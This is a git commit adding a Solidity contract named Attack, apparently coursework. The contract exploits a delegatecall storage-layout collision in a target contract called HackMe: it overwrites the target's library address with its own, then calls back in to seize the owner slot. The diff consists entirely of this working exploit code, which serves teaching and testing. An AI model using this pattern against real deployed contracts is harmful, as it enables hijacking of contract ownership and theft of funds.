731764861111d1924a37ed5011fda09a00eca690
samirasrh <Samira.Briongos.extern@srh-hochschulen.de>
2024-11-13 09:43:31 +0100

    Update Attack.sol

--- Attack.sol
+++ Attack.sol
@@ -1,1 +1,29 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
 
+contract Attack {
+    // Make sure the storage layout is the same as HackMe
+    // This will allow us to correctly update the state variables
+    address public lib;
+    address public owner;
+    uint public someNumber;
+
+    HackMe public hackMe;
+
+    constructor(HackMe _hackMe) {
+        hackMe = HackMe(_hackMe);
+    }
+
+    function attack() public {
+        // override address of lib
+        hackMe.doSomething(uint(uint160(address(this))));
+        // pass any number as input, the function doSomething() below will
+        // be called
+        hackMe.doSomething(1);
+    }
+
+    // function signature must match HackMe.doSomething()
+    function doSomething(uint _num) public {
+        owner = msg.sender;
+    }
+}
